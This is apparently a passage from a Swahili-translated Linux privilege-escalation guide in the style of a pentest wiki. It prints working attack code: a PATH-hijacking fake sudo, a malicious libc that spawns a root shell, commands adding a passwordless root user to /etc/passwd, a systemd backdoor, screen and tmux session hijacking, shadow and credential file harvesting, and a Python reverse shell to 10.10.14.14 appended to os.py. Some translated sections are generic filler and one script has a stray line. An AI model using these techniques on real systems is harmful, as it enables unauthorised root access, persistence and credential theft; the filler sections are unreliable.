Tafadhali kumbuka kuwa ikiwa mtumiaji anatumia kabati tofauti (sio bash) utahitaji kubadilisha faili zingine ili kuongeza njia mpya. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Au unaweza kutekeleza kitu kama hiki:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Inayoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **mahali ambapo faili za usanidi zilizopakuliwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaweka alama kwenye folda zingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo kwenye `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa ya kuandika** kwenye njia yoyote iliyotajwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf`, anaweza kuongeza mamlaka.\
Angalia **jinsi ya kutumia hitilafu hii ya usanidi** kwenye ukurasa ufuatao:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib katika `/var/tmp/flag15/`, itatumika na programu katika eneo hili kama ilivyoelezwa katika kipengele cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Uwezo wa Linux hutoa **sehemu ya mamlaka ya mizizi inayopatikana kwa mchakato**. Hii inagawanya mamlaka ya mizizi kuwa vitengo vidogo na vya kipekee. Kila kimoja cha vitengo hivi kinaweza kutolewa kwa mchakato kwa uhuru. Kwa njia hii, seti kamili ya mamlaka inapunguzwa, kupunguza hatari za uvamizi.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu uwezo na jinsi ya kuvunja ulinzi**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Vibali vya saraka

Katika saraka, **biti ya "utekelezaji"** inamaanisha kuwa mtumiaji anayehusika anaweza "**cd**" ndani ya saraka.\
Biti ya **"kusoma"** inamaanisha mtumiaji anaweza **kuorodhesha** **faili**, na biti ya **"kuandika"** inamaanisha mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Vidhibiti vya Kudhibiti Upatikanaji (ACLs) vinawakilisha safu ya pili ya vibali vya hiari, vinavyoweza **kubadilisha vibali vya kawaida vya ugo/rwx**. Vibali hivi huongeza udhibiti wa upatikanaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao sio wamiliki au sehemu ya kikundi. Kiwango hiki cha **undani kinahakikisha usimamizi sahihi wa upatikanaji**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Toa** mtumiaji "kali" vibali vya kusoma na kuandika kwenye faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACL maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Kufungua vikao vya kikao

Katika **toleo la zamani**, unaweza **kuteka** kikao cha **kikao** cha mtumiaji tofauti (**mizizi**).\
Katika **toleo jipya zaidi**, utaweza **kuunganisha** kwenye vikao vya skrini tu vya **mtumiaji wako mwenyewe**. Walakini, unaweza kupata **habari muhimu ndani ya kikao**.

### Kuteka vikao vya skrini

**Orodhesha vikao vya skrini**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (130).png>)

**Kujiunga na kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Kuteka Kikao cha Tmux

Hii ilikuwa tatizo na **toleo za zamani za tmux**. Sikuweza kuteka kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na mamlaka.

**Orodha ya vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Kujiunga na kikao**

To attach to a session, use the following command:

```
$ tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

If you are unsure about the available sessions, you can list them using the command:

```
$ tmux list-sessions
```

Once attached to a session, you can interact with it as if you were directly connected to the terminal.
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box kutoka HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vipengele vyote vya SSL na SSH vilivyoundwa kwenye mfumo wa Debian (Ubuntu, Kubuntu, nk) kati ya Septemba 2006 na Mei 13, 2008 vinaweza kuathiriwa na mdudu huu.\
Mdudu huu unatokea wakati wa kuunda ufunguo mpya wa ssh kwenye mfumo huo, kwani **ni uwezekano wa 32,768 tu uliowezekana**. Hii inamaanisha kuwa uwezekano wote unaweza kuhesabiwa na **ukiwa na ufunguo wa umma wa ssh unaweza kutafuta ufunguo wa kibinafsi unaofanana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Mipangilio ya kuvutia ya SSH

* **PasswordAuthentication:** Inaonyesha ikiwa uthibitishaji wa nenosiri unaruhusiwa. Chaguo-msingi ni `no`.
* **PubkeyAuthentication:** Inaonyesha ikiwa uthibitishaji wa ufunguo wa umma unaruhusiwa. Chaguo-msingi ni `yes`.
* **PermitEmptyPasswords**: Wakati uthibitishaji wa nenosiri unaruhusiwa, inaonyesha ikiwa seva inaruhusu kuingia kwenye akaunti zenye neno la siri tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaonyesha ikiwa mtumiaji wa "root" anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Inawezekana kuwa na maadili yafuatayo:

* `yes`: "root" anaweza kuingia kwa kutumia nenosiri na ufunguo wa kibinafsi
* `without-password` au `prohibit-password`: "root" anaweza kuingia tu na ufunguo wa kibinafsi
* `forced-commands-only`: "Root" anaweza kuingia tu kwa kutumia ufunguo wa kibinafsi na ikiwa chaguo la amri limeelezewa
* `no` : hapana

### AuthorizedKeysFile

Inaonyesha faili ambazo zinafunguo za umma zinazoweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kuwa na alama kama `%h`, ambayo itabadilishwa na saraka ya nyumbani. **Unaweza kuonyesha njia kamili** (kuanzia na `/`) au **njia za kulingana na nyumbani kwa mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Hiyo mipangilio itaonyesha kuwa ikiwa utajaribu kuingia kwa kutumia **funguo binafsi** ya mtumiaji "**jina la mtumiaji wa jaribio**" ssh italinganisha funguo ya umma ya funguo yako na zile zilizopo katika `/home/jina_la_mtumiaji_wa_jaribio/.ssh/authorized_keys` na `/home/jina_la_mtumiaji_wa_jaribio/access`

### ForwardAgent/AllowAgentForwarding

Kuhamisha wakala wa SSH inakuwezesha **kutumia funguo za SSH za ndani badala ya kuacha funguo** (bila nywila!) zikikaa kwenye seva yako. Kwa hivyo, utaweza **kuruka** kupitia ssh **kwenda kwenye mwenyeji** na kutoka hapo **kuruka kwenda mwenyeji mwingine** **kwa kutumia** **funguo** iliyopo kwenye **mwenyeji wako wa awali**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Tambua kuwa ikiwa `Host` ni `*` kila wakati mtumiaji anapohamia kwenye kompyuta tofauti, kompyuta hiyo itaweza kupata ufikiaji wa funguo (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kubadilisha** hii **chaguo** na kuruhusu au kukataa hii mipangilio.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia neno muhimu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa utagundua kuwa Forward Agent imewekwa katika mazingira fulani, soma ukurasa ufuatao **kwani unaweza kutumia hii kukiuka uwezo wa kujiongezea mamlaka**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Faili Zinazovutia

### Faili za Profaili

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **script ambazo zinatekelezwa wakati mtumiaji anapoendesha kabati jipya**. Kwa hiyo, ikiwa unaweza **kuandika au kuhariri yoyote kati yao, unaweza kuongeza mamlaka**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script ya wasifu isiyoeleweka imepatikana, unapaswa kuichunguza kwa **mambo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na nakala rudufu. Kwa hiyo, inashauriwa **kuzipata zote** na **kuangalia ikiwa unaweza kuzisoma** ili kuona **kama kuna hash** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **hashi za nywila** ndani ya faili ya `/etc/passwd` (au sawa).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Kwanza, tengeneza nenosiri kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na ongeza nenosiri lililozalishwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Au, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kudhoofisha usalama wa sasa wa kifaa.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**TAARIFA:** Katika majukwaa ya BSD `/etc/passwd` iko katika eneo la `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina la `/etc/spwd.db`.

Unapaswa kuhakiki ikiwa unaweza **kuandika kwenye faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye **faili ya usanidi wa huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kubadilisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/**, basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa wakati tomcat inapoanza.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na nakala rudufu au habari muhimu: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda hautaweza kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali/ Faili Zilizomilikiwa za Kupendeza

Kuna hali ambapo unaweza kupata faili au folda katika maeneo yasiyotarajiwa au ambayo yana umiliki usio wa kawaida. Hii inaweza kuwa ishara ya uwezekano wa kupata ufikiaji wa mamlaka ya juu.

#### Uchunguzi

1. Angalia folda za kawaida za mamlaka ya juu kama `/root`, `/var/www`, `/var/backups`, `/var/lib/mysql`, nk. Kuna uwezekano wa kupata faili zilizomilikiwa na watumiaji wenye mamlaka ya juu katika maeneo haya.

2. Angalia faili zilizomilikiwa na watumiaji wenye mamlaka ya juu kama `root`, `www-data`, `mysql`, nk. Unaweza kutumia amri kama `find / -user root -type f -ls` kuorodhesha faili zote zilizomilikiwa na mtumiaji "root".

3. Angalia faili zilizomilikiwa na watumiaji ambao sio wa kawaida au ambao hawapaswi kuwa na umiliki wa faili hizo. Hii inaweza kuwa ishara ya uwezekano wa kuingilia kati na kuchukua udhibiti wa faili hizo.

#### Vidokezo

- Kumbuka kuwa faili au folda zilizomilikiwa na watumiaji wenye mamlaka ya juu zinaweza kuwa hatari na zinaweza kutumiwa kwa kusudi mbaya. Hakikisha kuchunguza kwa uangalifu na kuchukua hatua sahihi ikiwa unapata faili au folda kama hizo.

- Kwa usalama zaidi, ni muhimu kufanya ukaguzi wa mara kwa mara wa mfumo wako ili kugundua faili au folda zisizotarajiwa au zilizomilikiwa na watumiaji wasiofaa.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili Zilizobadilishwa Ndani ya Dakika za Hivi Karibuni

To determine the modified files within the last few minutes, you can use the following command:

```bash
find / -type f -mmin -5
```

Hii itakupa orodha ya faili zote ambazo zimebadilishwa katika dakika chache zilizopita. Unaweza kubadilisha "-5" na idadi ya dakika unayotaka kutafuta.

Kumbuka kwamba utahitaji kuwa na ruhusa za kutosha kufikia folda zote kwenye mfumo wako ili kupata matokeo sahihi.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za DB za Sqlite

Sqlite ni mfumo wa usimamizi wa database ambao hutumika sana katika maombi ya simu na programu ndogo. Faili za DB za Sqlite zinaweza kuwa na habari muhimu na za siri, kama vile nywila, data ya watumiaji, au maelezo mengine ya kibinafsi.

Kwa mshambuliaji, kupata ufikiaji wa faili za DB za Sqlite kunaweza kuwa njia ya kuvunja usalama na kufikia habari nyeti. Kuna njia kadhaa za kufanya hivyo:

1. **Kupata faili za DB za Sqlite kwa njia ya moja kwa moja**: Mshambuliaji anaweza kutafuta faili za DB za Sqlite kwenye mfumo wa lengo na kuzipata moja kwa moja. Hii inaweza kuhusisha kutumia amri kama vile `find` au `locate` kwenye terminal.

2. **Kupata faili za DB za Sqlite kupitia programu**: Baadhi ya programu zinaweza kuhifadhi faili za DB za Sqlite kwenye eneo maalum kwenye mfumo. Mshambuliaji anaweza kutumia programu za kufuatilia trafiki kama Wireshark au Burp Suite kuchunguza mawasiliano ya programu na kugundua eneo la faili za DB za Sqlite.

3. **Kupata faili za DB za Sqlite kupitia mazingira ya kuhifadhi**: Ikiwa programu inatumia mazingira ya kuhifadhi kama vile Dropbox au Google Drive, mshambuliaji anaweza kujaribu kupata ufikiaji wa mazingira haya na kudownload faili za DB za Sqlite zilizohifadhiwa.

Kwa kuzingatia hatari ya kuvuja kwa habari nyeti, ni muhimu kwa watengenezaji na wamiliki wa programu kuchukua hatua za kuhakikisha usalama wa faili za DB za Sqlite. Hii inaweza kujumuisha kufunga ufikiaji wa faili hizo, kuzilinda kwa nywila, au hata kuzihifadhi kwenye seva salama.
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili Zilizofichwa

Kwenye mfumo wa Linux, kuna uwezekano wa kuwa na faili zilizofichwa ambazo hazionekani kwa urahisi. Hii inaweza kuwa hatari kwa sababu faili hizi zinaweza kuhifadhi habari nyeti au kutoa njia ya kufikia mamlaka ya juu.

Kuna njia kadhaa za kuona faili zilizofichwa:

1. Kutumia chaguo la "-a" wakati wa kutumia amri ya "ls" itaonyesha faili zote, pamoja na zile zilizofichwa. Kwa mfano, amri "ls -a" itaonyesha orodha kamili ya faili, pamoja na zile zilizofichwa.

2. Kutumia amri ya "ls" na kuchanganua matokeo kwa kutumia amri ya "grep" inaweza kusaidia kutambua faili zilizofichwa. Kwa mfano, amri "ls -l | grep '^d'" itaonyesha tu folda zilizofichwa.

3. Kutumia amri ya "find" inaweza kuonyesha faili zilizofichwa kwa kutafuta kwa jina au kwa kutumia vigezo vingine. Kwa mfano, amri "find / -name '.*'" itatafuta faili zote zilizofichwa kwenye mfumo mzima.

Ni muhimu kuwa mwangalifu wakati wa kufanya kazi na faili zilizofichwa, kwani zinaweza kuwa na athari kubwa kwa usalama wa mfumo.
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**

Kama mtumiaji wa kawaida, unaweza kuwa na uwezo wa kukimbia programu fulani au scripti ambazo ziko katika PATH yako. PATH ni orodha ya directories ambapo mfumo wako unatafuta programu na scripti wakati unapoamuru amri.

Kwa mfano, ikiwa una scripti inayoitwa `myscript` na iko katika moja ya directories zilizoorodheshwa katika PATH yako, unaweza kuikimbia kwa kuingiza tu jina lake katika terminal.

Hii inaweza kuwa na faida kwa mshambuliaji, kwani wanaweza kuweka scripti yao iliyoundwa kwa ujanja katika moja ya directories zilizoorodheshwa katika PATH yako. Kwa njia hii, wanaweza kuitumia kwa urahisi na kwa siri kwa kuzindua amri zinazohusiana na scripti yao.

Kwa hivyo, ni muhimu kuhakikisha kuwa scripti na programu zilizoorodheshwa katika PATH yako ni za kuaminika na salama. Unapaswa kuzingatia kwa uangalifu ni nini kinachopatikana katika PATH yako na kuhakikisha kuwa hakuna scripti au programu zisizohitajika au hatari zilizomo.

Unaweza kuchunguza scripti na programu zilizoorodheshwa katika PATH yako kwa kutumia amri kama vile `which` au `whereis`. Ikiwa unapata scripti au programu ambazo hazijulikani au zisizohitajika, unapaswa kuziondoa au kuzifunga ili kuzuia matumizi mabaya ya mshambuliaji.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Faili za Wavuti**

Faili za wavuti ni faili ambazo zinapatikana kwenye seva ya wavuti na zinaweza kufikiwa kupitia kivinjari cha wavuti. Kuna njia kadhaa za kupata habari muhimu kutoka kwa faili za wavuti, ambazo zinaweza kusaidia katika kutekeleza uchunguzi wa kina au kufanya udukuzi wa kibinafsi.

#### **1. Directory Listing (Orodha ya Dirs)**

Wakati mwingine, wakati faili za wavuti zimehifadhiwa kwenye seva ya wavuti, orodha ya saraka inaweza kuwezeshwa. Hii inamaanisha kuwa unaweza kuona orodha ya faili na saraka zilizopo kwenye seva. Ikiwa orodha ya saraka imekuwezeshwa, unaweza kupata habari muhimu kama majina ya faili, muundo wa saraka, na hata faili zilizofichwa.

#### **2. Backup Files (Faili za Nakala Rudufu)**

Wakati mwingine, wakati wa maendeleo ya wavuti, faili za nakala rudufu zinaweza kuachwa kwenye seva ya wavuti. Hii inaweza kutoa fursa ya kupata habari muhimu au hata kufikia faili za asili. Kwa hivyo, ni muhimu kutafuta faili za nakala rudufu kwenye seva ya wavuti.

#### **3. Configuration Files (Faili za Usanidi)**

Faili za usanidi ni faili ambazo zina habari muhimu kuhusu jinsi wavuti imeundwa na inavyofanya kazi. Kwa kawaida, faili hizi zina habari kama vile anwani za IP za seva, majina ya mtumiaji na nywila, na mipangilio mingine muhimu. Kwa hivyo, kupata faili za usanidi kunaweza kutoa ufikiaji wa habari muhimu na hata fursa ya kutekeleza udukuzi.

#### **4. Log Files (Faili za Kumbukumbu)**

Faili za kumbukumbu ni faili ambazo zina rekodi za matukio na shughuli zilizotokea kwenye seva ya wavuti. Kwa kawaida, faili hizi zina habari kama vile majaribio ya kuingia, shughuli za mtumiaji, na hata makosa ya mfumo. Kwa hivyo, kupata faili za kumbukumbu kunaweza kutoa ufikiaji wa habari muhimu na hata fursa ya kutekeleza udukuzi.

#### **5. Source Code (Nambari ya Chanzo)**

Nambari ya chanzo ni faili ambayo ina nambari ya programu ya wavuti. Kupata nambari ya chanzo kunaweza kutoa ufikiaji wa habari muhimu kuhusu jinsi wavuti imeundwa na inavyofanya kazi. Kwa kuwa nambari ya chanzo inaweza kuwa na habari nyeti kama vile anwani za IP, nywila, na ufikiaji wa seva, kupata nambari ya chanzo kunaweza kuwa na faida kubwa katika kutekeleza udukuzi.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakala Rudufu**

Nakala rudufu ni mchakato wa kuhifadhi nakala ya data ili kuhakikisha kuwa data inaweza kurejeshwa ikiwa itapotea au kuharibiwa. Kwa kawaida, nakala rudufu hufanywa kwa kuhifadhi data kwenye eneo tofauti na eneo la asili, kama vile diski ngumu ya nje au wingu.

Kufanya nakala rudufu ni hatua muhimu katika kuhakikisha usalama wa data. Inaweza kusaidia kurejesha data haraka baada ya tukio la kupoteza au kuharibika kwa data. Ni muhimu kuhakikisha kuwa nakala rudufu zinahifadhiwa kwa usalama na zinaweza kupatikana wakati zinahitajika.

Kuna njia mbalimbali za kufanya nakala rudufu, kama vile kutumia programu maalum za nakala rudufu au kufanya nakala rudufu kwa njia ya mwongozo. Ni muhimu kuchagua njia inayofaa kulingana na mahitaji yako na rasilimali zilizopo.

Kumbuka kuwa nakala rudufu pekee haitoshi kuhakikisha usalama wa data. Ni muhimu pia kutekeleza hatua za ziada za usalama, kama vile kuhifadhi nakala rudufu kwenye eneo salama na kulinda data na nywila imara.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili Zinazojulikana Zenye Nywila

Soma nambari ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa ambazo zinaweza kuwa na nywila**.\
**Zana nyingine ya kuvutia** unayoweza kutumia ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambayo ni programu huria inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux, na Mac.

### Kumbukumbu

Ikiwa unaweza kusoma kumbukumbu, huenda ukaweza kupata **habari muhimu/siri ndani yake**. Kumbukumbu isiyo ya kawaida zaidi, ndio inayovutia zaidi (labda).\
Pia, baadhi ya kumbukumbu za ukaguzi zilizo "**mbaya**" (zilizo na mlango wa nyuma?) zinaweza kukuruhusu **kurekodi nywila** ndani ya kumbukumbu za ukaguzi kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma kumbukumbu za kikundi** [**adm**](interesting-groups-linux-pe/#adm-group) itakuwa muhimu sana.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Utafutaji wa Vitambulisho/Vidokezo vya Kawaida/Regex

Unapaswa pia kuangalia faili zinazohusisha neno "**password**" katika **jina** au ndani ya **maudhui**, na pia angalia anwani za IP na barua pepe ndani ya magogo, au regexps za hash.
Sitaorodhesha hapa jinsi ya kufanya haya yote lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili Zinazoweza Kuandikwa

### Udukuzi wa Maktaba ya Python

Ikiwa unajua **mahali** ambapo skrini ya python itatekelezwa na unaweza **kuandika ndani** ya saraka hiyo au unaweza **kurekebisha maktaba za python**, unaweza kurekebisha maktaba ya OS na kuifanya kuwa na mlango wa nyuma (ikiwa unaweza kuandika mahali ambapo skrini ya python itatekelezwa, nakili na ubandike maktaba ya os.py).

Kwa **kurekebisha maktaba**, ongeza tu mwishoni mwa maktaba ya os.py mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Uchunguzi wa Logrotate

Kosa katika `logrotate` inawezesha watumiaji wenye **ruhusa ya kuandika** kwenye faili ya log au kwenye saraka ya wazazi kupata mamlaka ya juu. Hii ni kwa sababu `logrotate`, mara nyingi ikifanya kazi kama **root**, inaweza kubadilishwa ili kutekeleza faili za aina yoyote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kuangalia ruhusa si tu katika _/var/log_ lakini pia katika saraka yoyote ambapo mzunguko wa logi unatumika.

{% hint style="info" %}
Kosa hili linaathiri toleo la `logrotate` `3.18.0` na matoleo ya zamani
{% endhint %}

Maelezo zaidi kuhusu kosa hili yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia kosa hili kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Kosa hili ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo wakati wowote unapogundua kuwa unaweza kubadilisha logi, angalia ni nani anayesimamia logi hizo na angalia ikiwa unaweza kupata mamlaka ya juu kwa kubadilisha logi hizo na viungo vya ishara.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

